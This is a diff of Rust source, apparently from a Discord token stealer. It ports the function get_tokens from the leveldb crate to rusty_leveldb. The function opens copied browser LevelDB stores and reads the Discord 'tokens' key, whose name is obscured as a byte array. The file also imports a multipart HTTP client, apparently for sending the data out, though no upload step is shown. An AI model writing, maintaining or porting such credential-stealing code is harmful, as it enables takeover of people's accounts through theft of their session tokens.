@@ -1,8 +1,6 @@
 use crate::{crypto, utils};
-
-use leveldb::database::Database;
-use leveldb::options::{Options, ReadOptions};
 use reqwest::blocking::multipart;
+use rusty_leveldb::{Options, DB};
 use serde_json::Value;
 use std::ffi::CString;
 use std::path::{Path, PathBuf};
@@ -217,15 +215,13 @@ pub fn get_tokens() -> Vec<String> {
             continue;
         }
 
-        let options = Options::new();
-        let database = match Database::open(&temp_dir, &options) {
+        let options = Options::default();
+        let mut database = match DB::open(&temp_dir, options) {
             Ok(database) => database,
             Err(_) => {
                 continue;
             }
         };
-
-        let read_opts = ReadOptions::new();
 
         // _https://discord.com☺tokens
         let key = [
@@ -233,7 +229,7 @@ pub fn get_tokens() -> Vec<String> {
             109, 0, 1, 116, 111, 107, 101, 110, 115,
         ];
 
-        let bytes = match database.get_u8(&read_opts, &key).unwrap() {
+        let bytes = match database.get(&key) {
             Some(bytes) => bytes,
             None => continue,
         };
